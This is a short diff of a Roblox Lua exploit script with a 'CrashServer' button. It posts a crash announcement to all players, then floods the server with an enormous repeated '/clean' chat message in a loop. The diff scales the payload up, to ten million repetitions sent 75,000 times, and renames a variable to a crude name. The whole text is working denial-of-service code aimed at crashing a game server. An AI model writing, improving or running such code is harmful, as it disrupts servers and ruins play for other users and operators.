@@ -45,11 +45,11 @@ CrashServer.MouseButton1Down:connect(function()
 
 wait(0) local A_1 = "Crashing the Server with 22 Dupe.." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
-  local prefixe = "/"
+local natass = "/"
 
-    local Message = (prefixe.. "clean".." "):rep(100000)
+    local Message = (natass.. "clean".." "):rep(10000000)
 
-    for i = 1, 750 do
+    for i = 1, 75000 do
         game.Players:Chat(Message)
     end
 
